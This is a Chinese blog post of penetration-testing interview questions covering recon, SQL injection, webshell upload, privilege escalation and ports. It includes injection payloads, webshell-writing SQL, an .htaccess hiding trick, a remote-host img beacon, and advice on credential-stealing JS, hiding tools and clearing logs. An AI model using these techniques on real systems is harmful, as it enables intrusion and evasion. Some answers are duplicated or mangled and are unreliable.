@@ -1,0 +1,418 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>渗透测试面经 | I0gan's blog</title><script src="//unpkg.com/valine/dist/Valine.min.js"></script><script>var config = {"root":"/","path":"search.json"}</script><script src="//unpkg.com/mermaid@8.13.5/dist/mermaid.min.js"></script><script>mermaid.initialize({
+ startOnLoad: true
+ , theme: 'dark'
+});</script><link rel="stylesheet" href="/css/arknights.css"><link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.4.0/styles/atom-one-dark-reasonable.min.css"><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><meta name="generator" content="Hexo 6.3.0"></head><body style="background-image:url(/img/bg.jpg);"><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><ol class="navContent"><li class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></li><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/shell/"><span class="navItemTitle">Shell</span></a></li></ol></nav><div class="search-popup"><div id="search-result"></div></div></header><article><div id="post-bg"><div id="post-title"><h1>渗透测试面经</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2021-04-06T10:46:47.000Z" id="date"> 2021-04-06</time></div></span><br><span>Last Update: <div class="control"><time datetime="2022-10-24T10:53:29.572Z" id="updated"> 2022-10-24</time></div></span><br><span>Word Count: <div class="control">12.2k</div></span><br><span>Read Time: <div class="control">46 min</div></span></div></div><hr><div id="post-content"><p>ref: <a target="_blank" rel="noopener" href="https://github.com/Mr-xn/BurpSuite-collections/blob/588aac9715b754cebe2a520bf81ec38d66500a33/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%982019%E7%89%88.md">https://github.com/Mr-xn/BurpSuite-collections/blob/588aac9715b754cebe2a520bf81ec38d66500a33/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%982019%E7%89%88.md</a></p>
+<h2 id="思路流程"><a href="#思路流程" class="headerlink" title="思路流程"></a>思路流程</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><ol>
+<li>服务器的相关信息（真实ip，系统类型，版本，开放端口，WAF等）</li>
+<li>网站指纹识别（包括，cms，cdn，证书等），dns记录</li>
+<li>whois信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等）</li>
+<li>子域名收集，旁站，C段等</li>
+<li>google hacking针对化搜索，pdf文件，中间件版本，弱口令扫描等</li>
+<li>扫描网站目录结构，爆后台，网站banner，测试文件，备份等敏感文件泄漏等</li>
+<li>传输协议，通用漏洞，exp，github源码等</li>
+</ol>
+<h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h3><ol>
+<li>浏览网站，看看网站规模，功能，特点等</li>
+<li>端口，弱口令，目录等扫描,对响应的端口进行漏洞探测，比如 rsync,心脏出血，mysql,ftp,ssh弱口令等。</li>
+<li>XSS，SQL注入，上传，命令注入，CSRF，cookie安全检测，敏感信息，通信数据传输，暴力破解，任意文件上传，越权访问，未授权访问，目录遍历，文件 包含，重放攻击（短信轰炸），服务器漏洞检测，最后使用漏扫工具等</li>
+</ol>
+<h3 id="漏洞利用-amp-权限提升"><a href="#漏洞利用-amp-权限提升" class="headerlink" title="漏洞利用&amp;权限提升"></a>漏洞利用&amp;权限提升</h3><ul>
+<li>mysql提权，serv-u提权，oracle提权</li>
+<li>windows 溢出提权</li>
+<li>linux脏牛,内核漏洞提权e</li>
+</ul>
+<h3 id="清除测试数据-amp-输出报告"><a href="#清除测试数据-amp-输出报告" class="headerlink" title="清除测试数据&amp;输出报告"></a>清除测试数据&amp;输出报告</h3><p>i 日志、测试数据的清理 ii 总结，输出渗透测试报告，附修复方案</p>
+<h3 id="复测"><a href="#复测" class="headerlink" title="复测"></a>复测</h3><p>验证并发现是否有新漏洞，输出报告，归档</p>
+<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p><strong>1.拿到一个待检测的站，你觉得应该先做什么？</strong></p>
+<ol>
+<li><p>信息收集<br>​ 1. 获取域名的whois信息,获取注册者邮箱姓名电话等，丢社工库里看看有没有泄露密码，然后尝试用泄露的密码进行登录后台。 用邮箱做关键词进行丢进搜索引擎。 利用搜索到的关联信息找出其他邮箱进而得到常用社交账号。 社工找出社交账号，里面或许会找出管理员设置密码的习惯 。 利用已有信息生成专用字典。<br>​ 2. 查询服务器旁站以及子域名站点，因为主站一般比较难，所以先看看旁站有没有通用性的cms或者其他漏洞。<br>​ 3. 查看服务器操作系统版本，web中间件，看看是否存在已知的漏洞，比如IIS，APACHE,NGINX的解析漏洞<br>​ 4. 查看IP，进行IP地址端口扫描，对响应的端口进行漏洞探测，比如 rsync,心脏出血，mysql,ftp,ssh弱口令等。<br>​ 5. 扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏，比如php探针<br>​ 6. google hack 进一步探测网站的信息，后台，敏感文件</p>
+</li>
+<li><p>漏洞扫描<br>​ 开始检测漏洞，如XSS,XSRF,sql注入，代码执行，命令执行，越权访问，目录读取，任意文件读取，下载，文件包含，​ 远程命令执行，弱口令，上传，编辑器漏洞，暴力破解等</p>
+</li>
+<li><p>漏洞利用<br>​ 利用以上的方式拿到webshell，或者其他权限</p>
+</li>
+<li><p>权限提升<br>​ 提权服务器，比如windows下mysql的udf提权，serv-u提权，windows低版本的漏洞，如iis6,pr,巴西烤肉，linux脏牛漏洞，linux内核版本漏洞提权，linux下的mysql system提权以及oracle低权限提权</p>
+</li>
+<li><p>日志清理</p>
+</li>
+<li><p>总结报告及修复方案</p>
+</li>
+</ol>
+<p><strong>2.判断出网站的CMS对渗透有什么意义？</strong></p>
+<p> 查找网上已曝光的程序漏洞。</p>
+<p> 如果开源，还能下载相对应的源码进行代码审计。</p>
+<p><strong>3.一个成熟并且相对安全的CMS，渗透时扫目录的意义？</strong></p>
+<p> 敏感文件、二级目录扫描</p>
+<p> 站长的误操作比如：网站备份的压缩文件、说明.txt、二级目录可能存放着其他站点</p>
+<p><strong>4.常见的网站服务器容器。</strong></p>
+<p> IIS、Apache、nginx、Lighttpd、Tomcat</p>
+<p><strong>5.mysql注入点，用工具对目标站直接写入一句话，需要哪些条件？</strong></p>
+<p> root权限以及网站的绝对路径。</p>
+<p><strong>6.目前已知哪些版本的容器有解析漏洞，具体举例。</strong></p>
+<p> <strong>IIS 6.0</strong> &#x2F;xx.asp&#x2F;xx.jpg “xx.asp”是文件夹名</p>
+<p> IIS 7.0&#x2F;7.5 默认Fast-CGI开启，直接在url中图片地址后面输入&#x2F;1.php，会把正常图片当成php解析</p>
+<p> Nginx 版本小于等于0.8.37，利用方法和IIS 7.0&#x2F;7.5一样，Fast-CGI关闭情况下也可利用。 空字节代码 xxx.jpg.php</p>
+<p> Apache 上传的文件命名为：test.php.x1.x2.x3，Apache是从右往左判断后缀</p>
+<p> lighttpd xx.jpg&#x2F;xx.php，<strong>不全,请小伙伴们在评论处不吝补充，谢谢！</strong></p>
+<p><strong>7.如何手工快速判断目标站是windows还是linux服务器？</strong></p>
+<p> linux大小写敏感,windows大小写不敏感。</p>
+<p><strong>8.为何一个mysql数据库的站，只有一个80端口开放？</strong></p>
+<p> 更改了端口，没有扫描出来。</p>
+<p> 站库分离。</p>
+<p> 3306端口不对外开放</p>
+<p><strong>9、3389无法连接的几种情况</strong></p>
+<p> 没开放3389 端口</p>
+<p> 端口被修改</p>
+<p> 防护拦截</p>
+<p> 处于内网(需进行端口转发)</p>
+<p><strong>10.如何突破注入时字符被转义？</strong></p>
+<p> 宽字符注入</p>
+<p> hex编码绕过</p>
+<p><strong>11.在某后台新闻编辑界面看到编辑器，应该先做什么？</strong></p>
+<p> 查看编辑器的名称版本,然后搜索公开的漏洞。</p>
+<p><strong>12.拿到一个webshell发现网站根目录下有.htaccess文件，我们能做什么？</strong></p>
+<p> 能做的事情很多，用隐藏网马来举例子： 插入 &lt;FilesMatch “xxx.jpg”&gt; SetHandler application&#x2F;x-httpd-php .jpg文件会被解析成.php文件。</p>
+<p> 具体其他的事情，不好详说，建议大家自己去搜索语句来玩玩。</p>
+<p><strong>13.注入漏洞只能查账号密码？</strong></p>
+<p> 只要权限广，拖库脱到老。</p>
+<p><strong>14.安全狗会追踪变量，从而发现出是一句话木马吗？</strong></p>
+<p> 是根据特征码，所以很好绕过了，只要思路宽，绕狗绕到欢，但这应该不会是一成不变的。</p>
+<p><strong>15.access 扫出后缀为asp的数据库文件，访问乱码，****如何实现到本地利用？</strong></p>
+<p> 迅雷下载，直接改后缀为.mdb。</p>
+<p><strong>16.提权时选择可读写目录，为何尽量不用带空格的目录？</strong></p>
+<p> 因为exp执行多半需要空格界定参数</p>
+<p><strong>17.某服务器有站点A,B 为何在A的后台添加test用户，访问B的后台。发现也添加上了test用户？</strong></p>
+<p> 同数据库。</p>
+<p><strong>18.注入时可以不使用and 或or 或xor，直接order by 开始注入吗？</strong></p>
+<p> and&#x2F;or&#x2F;xor，前面的1&#x3D;1、1&#x3D;2步骤只是为了判断是否为注入点，如果已经确定是注入点那就可以省那步骤去。</p>
+<p><strong>19:某个防注入系统，在注入时会提示：</strong></p>
+<p>系统检测到你有非法注入的行为。 已记录您的ip xx.xx.xx.xx 时间:2016:01-23 提交页面:test.asp?id&#x3D;15 提交内容:and 1&#x3D;1</p>
+<p><strong>20、如何利用这个防注入系统拿shell？</strong></p>
+<p>在URL里面直接提交一句话，这样网站就把你的一句话也记录进数据库文件了 这个时候可以尝试寻找网站的配置文件 直接上菜刀链接。</p>
+<p><strong>21.上传大马后访问乱码时，有哪些解决办法？</strong></p>
+<p> 浏览器中改编码。</p>
+<p><strong>22.审查上传点的元素有什么意义？</strong></p>
+<p> 有些站点的上传文件类型的限制是在前端实现的，这时只要增加上传类型就能突破限制了。</p>
+<p><strong>23.目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？</strong></p>
+<p> 先爆破用户名，再利用被爆破出来的用户名爆破密码。</p>
+<p> 其实有些站点，在登陆处也会这样提示</p>
+<p> 所有和数据库有交互的地方都有可能有注入。</p>
+<p><strong>24.目标站发现某txt的下载地址为</strong><a target="_blank" rel="noopener" href="http://www.test.com/down/down.php?file=/upwdown/1.txt%EF%BC%8C%E4%BD%A0%E6%9C%89%E4%BB%80%E4%B9%88%E6%80%9D%E8%B7%AF%EF%BC%9F">http://www.test.com/down/down.php?file=/upwdown/1.txt，你有什么思路？</a></p>
+<p> 这就是传说中的下载漏洞！在file&#x3D;后面尝试输入index.php下载他的首页文件，然后在首页文件里继续查找其他网站的配置文件，可以找出网站的数据库密码和数据库的地址。</p>
+<p><strong>25.甲给你一个目标站，并且告诉你根目录下存在&#x2F;abc&#x2F;目录，并且此目录下存在编辑器和admin目录。请问你的想法是？</strong></p>
+<p> 直接在网站二级目录&#x2F;abc&#x2F;下扫描敏感文件及目录。</p>
+<p><strong>26.在有shell的情况下，如何使用xss实现对目标站的长久控制？</strong></p>
+<p> 后台登录处加一段记录登录账号密码的js，并且判断是否登录成功，如果登录成功，就把账号密码记录到一个生僻的路径的文件中或者直接发到自己的网站文件中。(此方法适合有价值并且需要深入控制权限的网络)。</p>
+<p> 在登录后才可以访问的文件中插入XSS脚本。</p>
+<p><strong>27.后台修改管理员密码处，原密码显示为*。你觉得该怎样实现读出这个用户的密码？</strong></p>
+<p> 审查元素 把密码处的password属性改成text就明文显示了</p>
+<p><strong>28.目标站无防护，上传图片可以正常访问，上传脚本格式访问则403.什么原因？</strong></p>
+<p> 原因很多，有可能web服务器配置把上传目录写死了不执行相应脚本，尝试改后缀名绕过</p>
+<p><strong>29.审查元素得知网站所使用的防护软件，你觉得怎样做到的？</strong></p>
+<p> 在敏感操作被拦截，通过界面信息无法具体判断是什么防护的时候，F12看HTML体部 比如护卫神就可以在名称那看到内容。</p>
+<p><strong>30.在win2003服务器中建立一个 .zhongzi文件夹用意何为？</strong></p>
+<p> 隐藏文件夹，为了不让管理员发现你传上去的工具。</p>
+<p><strong>31、sql注入有以下两个测试选项，选一个并且阐述不选另一个的理由：</strong></p>
+<p>A. demo.jsp?id&#x3D;2+1 B. demo.jsp?id&#x3D;2-1 选B，在 URL 编码中 + 代表空格，可能会造成混淆</p>
+<p><strong>32、以下链接存在 sql 注入漏洞，对于这个变形注入，你有什么思路？</strong></p>
+<p>demo.do?DATA&#x3D;AjAxNg&#x3D;&#x3D; DATA有可能经过了 base64 编码再传入服务器，所以我们也要对参数进行 base64 编码才能正确完成测试</p>
+<p><strong>33、发现 demo.jsp?uid&#x3D;110 注入点，你有哪几种思路获取 webshell，哪种是优选？</strong></p>
+<p>有写入权限的，构造联合查询语句使用using INTO OUTFILE，可以将查询的输出重定向到系统的文件中，这样去写入 WebShell 使用 sqlmap –os-shell 原理和上面一种相同，来直接获得一个 Shell，这样效率更高 通过构造联合查询语句得到网站管理员的账户和密码，然后扫后台登录后台，再在后台通过改包上传等方法上传 Shell</p>
+<p><strong>34、CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？</strong></p>
+<p><strong>XSS是跨站脚本攻击</strong>，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。修复方式：对字符实体进行转义、使用HTTP Only来禁止JavaScript读取Cookie值、输入时校验、浏览器与Web应用端采用相同的字符编码。</p>
+<p><strong>CSRF是跨站请求伪造攻击</strong>，XSS是实现CSRF的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。修复方式：筛选出需要防范CSRF的页面然后嵌入Token、再次输入密码、检验Referer XXE是XML外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。修复方式：XML解析库在调用时严格禁止对外部实体的解析。</p>
+<p><strong>35、CSRF、SSRF和重放攻击有什么区别？</strong></p>
+<p>CSRF是跨站请求伪造攻击，由客户端发起 SSRF是服务器端请求伪造，由服务器发起 重放攻击是将截获的数据包进行重放，达到身份认证等目的</p>
+<p><strong>36、说出至少三种业务逻辑漏洞，以及修复方式？</strong></p>
+<p><strong>密码找回漏洞</strong>中存在</p>
+<p>1）密码允许暴力破解、</p>
+<p>2）存在通用型找回凭证、</p>
+<p>3）可以跳过验证步骤、</p>
+<p>4）找回凭证可以拦包获取</p>
+<p>等方式来通过厂商提供的密码找回功能来得到密码。 <strong>身份认证漏洞</strong>中最常见的是</p>
+<p>1）会话固定攻击</p>
+<p>2） Cookie 仿冒</p>
+<p>只要得到 Session 或 Cookie 即可伪造用户身份。 <strong>验证码漏洞</strong>中存在</p>
+<p>1）验证码允许暴力破解</p>
+<p>2）验证码可以通过 Javascript 或者改包的方法来进行绕过</p>
+<p><strong>37、圈出下面会话中可能存在问题的项，并标注可能会存在的问题？</strong></p>
+<p>get &#x2F;ecskins&#x2F;demo.jsp?uid&#x3D;2016031900&amp;keyword&#x3D;”hello world” HTTP&#x2F;1.1Host:<em><strong>.com:82User-Agent:Mozilla&#x2F; 5.0 Firefox&#x2F;40Accept:text&#x2F;css,&#x2F;;q&#x3D;0.1 Accept-Language:zh-CN;zh;q&#x3D;0.8;en-US;q&#x3D;0.5,en;q&#x3D;0.3 Referer:http:&#x2F;&#x2F;</strong></em>****.com&#x2F;eciop&#x2F;orderForCC&#x2F; cgtListForCC.htm?zone&#x3D;11370601&amp;v&#x3D;145902 Cookie:myguid1234567890&#x3D;1349db5fe50c372c3d995709f54c273d; uniqueserid&#x3D;session_OGRMIFIYJHAH5_HZRQOZAMHJ; st_uid&#x3D;N90PLYHLZGJXI-NX01VPUF46W; status&#x3D;True Connection:keep-alive</p>
+<p>有写入权限的，构造联合查询语句使用using INTO OUTFILE，可以将查询的输出重定向到系统的文件中，这样去写入 WebShell 使用 sqlmap –os-shell 原理和上面一种相同，来直接获得一个 Shell，这样效率更高 通过构造联合查询语句得到网站管理员的账户和密码，然后扫后台登录后台，再在后台通过改包上传等方法上传 Shell</p>
+<p><strong>38、给你一个网站你是如何来渗透测试的?</strong> 在获取书面授权的前提下。</p>
+<p><strong>39、sqlmap，怎么对一个注入点注入？</strong> 1）如果是get型号，直接，sqlmap -u “诸如点网址”. 2) 如果是post型诸如点，可以sqlmap -u “注入点网址” –data&#x3D;”post的参数” 3）如果是cookie，X-Forwarded-For等，可以访问的时候，用burpsuite抓包，注入处用号替换，放到文件里，然后sqlmap -r “文件地址”</p>
+<p><strong>40、nmap，扫描的几种方式</strong></p>
+<p><strong>41、sql注入的几种类型？</strong> 1）报错注入 2）bool型注入 3）延时注入 4）宽字节注入 <strong>42、报错注入的函数有哪些？ 10个</strong> 1）and extractvalue(1, concat(0x7e,(select @@version),0x7e))】】】 2）通过floor报错 向下取整 3）+and updatexml(1, concat(0x7e,(secect @@version),0x7e),1) 4）.geometrycollection()select from test where id&#x3D;1 and geometrycollection((select from(selectfrom(select user())a)b)); 5）.multipoint()select from test where id&#x3D;1 and multipoint((select from(select from(select user())a)b)); 6）.polygon()select from test where id&#x3D;1 and polygon((select from(select from(select user())a)b)); 7）.multipolygon()select from test where id&#x3D;1 and multipolygon((select from(select from(select user())a)b)); 8）.linestring()select from test where id&#x3D;1 and linestring((select from(select from(select user())a)b)); 9）.multilinestring()select from test where id&#x3D;1 and multilinestring((select from(select from(select user())a)b)); 10）.exp()select from test where id&#x3D;1 and exp(~(select * from(select user())a));</p>
+<p><strong>43、延时注入如何来判断？</strong> if(ascii(substr(“hello”, 1, 1))&#x3D;104, sleep(5), 1)</p>
+<p><strong>44、盲注和延时注入的共同点？</strong> 都是一个字符一个字符的判断</p>
+<p><strong>45、如何拿一个网站的webshell？</strong> 上传，后台编辑模板，sql注入写文件，命令执行，代码执行， 一些已经爆出的cms漏洞，比如dedecms后台可以直接建立脚本文件，wordpress上传插件包含脚本文件zip压缩包等</p>
+<p><strong>46、sql注入写文件都有哪些函数？</strong> select ‘一句话’ into outfile ‘路径’ select ‘一句话’ into dumpfile ‘路径’ select ‘’ into dumpfile ‘d:\wwwroot\baidu.com\nvhack.php’;</p>
+<p><strong>47、如何防止CSRF?</strong> 1,验证referer 2，验证token 详细：<a target="_blank" rel="noopener" href="http://cnodejs.org/topic/5533dd6e9138f09b629674fd">http://cnodejs.org/topic/5533dd6e9138f09b629674fd</a></p>
+<p><strong>48、owasp 漏洞都有哪些？</strong> 1、SQL注入防护方法： 2、失效的身份认证和会话管理 3、跨站脚本攻击XSS 4、直接引用不安全的对象 5、安全配置错误 6、敏感信息泄露 7、缺少功能级的访问控制 8、跨站请求伪造CSRF 9、使用含有已知漏洞的组件 10、未验证的重定向和转发</p>
+<p><strong>49、SQL注入防护方法？</strong> 1、使用安全的API 2、对输入的特殊字符进行Escape转义处理 3、使用白名单来规范化输入验证方法 4、对客户端输入进行控制，不允许输入SQL注入相关的特殊字符 5、服务器端在提交数据库进行SQL查询之前，对特殊字符进行过滤、转义、替换、删除。</p>
+<p><strong>50、代码执行，文件读取，命令执行的函数都有哪些？</strong></p>
+<p>1）代码执行：</p>
+<p>eval,preg_replace+&#x2F;e,assert,call_user_func,call_user_func_array,create_function</p>
+<p>2）文件读取：</p>
+<p>file_get_contents(),highlight_file(),fopen(),read</p>
+<p>file(),fread(),fgetss(), fgets(),parse_ini_file(),show_source(),file()等 3)命令执行：</p>
+<p>system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open()</p>
+<p><strong>51、img标签除了onerror属性外，还有其他获取管理员路径的办法吗？</strong> src指定一个远程的脚本文件，获取referer</p>
+<p><strong>52、img标签除了onerror属性外，并且src属性的后缀名，必须以.jpg结尾，怎么获取管理员路径。</strong></p>
+<p>1）远程服务器修改apache配置文件，配置.jpg文件以php方式来解析 AddType application&#x2F;x-httpd-php .jpg <img src=http://xss.tv/1.jpg> 会以php方式来解析</p>
+<p><strong>53、为什么aspx木马权限比asp大？</strong></p>
+<p>aspx使用的是.net技术。IIS 中默认不支持，ASP只是脚本语言而已。入侵的时候asp的木马一般是guest权限…APSX的木马一般是users权限。</p>
+<p><strong>54、如何绕过waf？</strong></p>
+<ul>
+<li>大小写转换法</li>
+<li>干扰字符 <code>/*!*/</code></li>
+<li>编码 base64 unicode hex url ascll</li>
+<li>复参数</li>
+</ul>
+<p><strong>55、如何向服务器写入webshell？</strong></p>
+<ul>
+<li>各种上传漏洞</li>
+<li>mysql具有写入权限,用sql语句写入shell</li>
+<li>http put方法</li>
+</ul>
+<p><strong>56、渗透测试中常见的端口</strong></p>
+<p>1,web类(web漏洞&#x2F;敏感目录) 第三方通用组件漏洞struts thinkphp jboss ganglia zabbix</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">80 web <br>80-89 web <br>8000-9090 web<br></code></pre></td></tr></table></figure>
+
+<p>2,数据库类(扫描弱口令)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1433 MSSQL <br>1521 Oracle <br>3306 MySQL <br>5432 PostgreSQL <br></code></pre></td></tr></table></figure>
+
+<p>3,特殊服务类(未授权&#x2F;命令执行类&#x2F;漏洞)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">443 SSL心脏滴血 <br>873 Rsync未授权 <br>5984 CouchDB http://xxx:5984/_utils/ <br>6379 redis未授权 <br>7001,7002 WebLogic默认弱口令，反序列 <br>9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 <br>11211 memcache未授权访问 <br>27017,27018 Mongodb未授权访问 <br>50000 SAP命令执行 <br>50070,50030 hadoop默认端口未授权访问<br></code></pre></td></tr></table></figure>
+
+<p>4,常用端口类(扫描弱口令&#x2F;端口爆破)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">21 ftp <br>22 SSH <br>23 Telnet <br>2601,2604 zebra路由，默认密码zebra<br>3389 远程桌面<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>端口合计详情</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">21 ftp <br>22 SSH <br>23 Telnet <br>80 web <br>80-89 web <br>161 SNMP <br>389 LDAP <br>443 SSL心脏滴血以及一些web漏洞测试 <br>445 SMB <br>512,513,514 Rexec <br>873 Rsync未授权 <br>1025,111 NFS <br>1433 MSSQL <br>1521 Oracle:(iSqlPlus Port:5560,7778) <br>2082/2083 cpanel主机管理系统登陆 （国外用较多）<br>2222 DA虚拟主机管理系统登陆 （国外用较多） <br>2601,2604 zebra路由，默认密码zebra<br>3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了 <br>3306 MySQL <br>3312/3311 kangle主机管理系统登陆 <br>3389 远程桌面 <br>4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网 <br>5432 PostgreSQL <br>5900 vnc <br>5984 CouchDB http://xxx:5984/_utils/ <br>6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网 <br>6379 redis未授权 <br>7001,7002 WebLogic默认弱口令，反序列 <br>7778 Kloxo主机控制面板登录 <br>8000-9090 都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上 <br>8080 tomcat/WDCP主机管理系统，默认弱口令 <br>8080,8089,9090 JBOSS <br>8083 Vestacp主机管理系统 （国外用较多） <br>8649 ganglia <br>8888 amh/LuManager 主机管理系统默认端口 <br>9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 <br>10000 Virtualmin/Webmin 服务器虚拟主机管理系统 <br>11211 memcache未授权访问 <br>27017,27018 Mongodb未授权访问 <br>28017 mongodb统计页面 <br>50000 SAP命令执行 <br>50070,50030 hadoop默认端口未授权访问<br></code></pre></td></tr></table></figure>
+
+<h2 id="深信服一面"><a href="#深信服一面" class="headerlink" title="深信服一面:"></a>深信服一面:</h2><ul>
+<li>了解哪些漏洞</li>
+<li>文件上传有哪些防护方式</li>
+<li>用什么扫描端口，目录</li>
+<li>如何判断注入</li>
+<li>注入有防护怎么办</li>
+<li>有没有写过tamper</li>
+<li>3306 1443 8080是什么端口</li>
+<li>计算机网络从物理层到应用层xxxx</li>
+<li>有没有web服务开发经验</li>
+<li>如何向服务器写入webshell</li>
+<li>有没有用过xss平台</li>
+<li>网站渗透的流程</li>
+<li>mysql两种提权方式（udf，？）</li>
+<li>常见加密方式xxx</li>
+<li>ddos如何防护</li>
+<li>有没有抓过包，会不会写wireshark过滤规则</li>
+<li>清理日志要清理哪些</li>
+</ul>
+<h2 id="SQL注入防护"><a href="#SQL注入防护" class="headerlink" title="SQL注入防护"></a>SQL注入防护</h2><p>1、使用安全的API<br>2、对输入的特殊字符进行Escape转义处理，对引号进行转译的函数<code>addslashes </code><br>3、使用白名单来规范化输入验证方法<br>4、对客户端输入进行控制，不允许输入SQL注入相关的特殊字符<br>5、服务器端在提交数据库进行SQL查询之前，对特殊字符进行过滤、转义、替换、删除。<br>6、规范编码,字符集</p>
+<h2 id="为什么参数化查询可以防止sql注入"><a href="#为什么参数化查询可以防止sql注入" class="headerlink" title="为什么参数化查询可以防止sql注入"></a>为什么参数化查询可以防止sql注入</h2><p>原理:</p>
+<p>使用参数化查询数据库服务器不会把参数的内容当作sql指令的一部分来执行，是在数据库完成sql指令的编译后才套用参数运行</p>
+<p>简单的说: 参数化能防注入的原因在于,语句是语句，参数是参数，参数的值并不是语句的一部分，数据库只按语句的语义跑</p>
+<h2 id="SQL头注入点"><a href="#SQL头注入点" class="headerlink" title="SQL头注入点"></a>SQL头注入点</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">UA<br>REFERER<br>COOKIE<br>IP<br></code></pre></td></tr></table></figure>
+
+<h2 id="盲注是什么？怎么盲注？"><a href="#盲注是什么？怎么盲注？" class="headerlink" title="盲注是什么？怎么盲注？"></a>盲注是什么？怎么盲注？</h2><p>盲注是在SQL注入攻击过程中，服务器关闭了错误回显，我们单纯通过服务器返回内容的变化来判断是否存在SQL注入和利用的方式。盲注的手段有两种，一个是通过页面的返回内容是否正确(boolean-based)，来验证是否存在注入。一个是通过sql语句处理时间的不同来判断是否存在注入(time-based)，在这里，可以用benchmark，sleep等造成延时效果的函数，也可以通过构造大笛卡儿积的联合查询表来达到延时的目的。</p>
+<h2 id="宽字节注入产生原理以及根本原因"><a href="#宽字节注入产生原理以及根本原因" class="headerlink" title="宽字节注入产生原理以及根本原因"></a>宽字节注入产生原理以及根本原因</h2><h3 id="产生原理"><a href="#产生原理" class="headerlink" title="产生原理"></a>产生原理</h3><p>在数据库使用了宽字符集而WEB中没考虑这个问题的情况下，在WEB层，由于0XBF27是两个字符，在PHP中比如addslash和magic_quotes_gpc开启时，由于会对0x27单引号进行转义，因此0xbf27会变成0xbf5c27,而数据进入数据库中时，由于0XBF5C是一个另外的字符，因此\转义符号会被前面的bf带着”吃掉”，单引号由此逃逸出来可以用来闭合语句。</p>
+<h3 id="在哪里编码"><a href="#在哪里编码" class="headerlink" title="在哪里编码"></a>在哪里编码</h3><h3 id="根本原因"><a href="#根本原因" class="headerlink" title="根本原因"></a>根本原因</h3><p>character_set_client(客户端的字符集)和character_set_connection(连接层的字符集)不同,或转换函数如，iconv、mb_convert_encoding使用不当。</p>
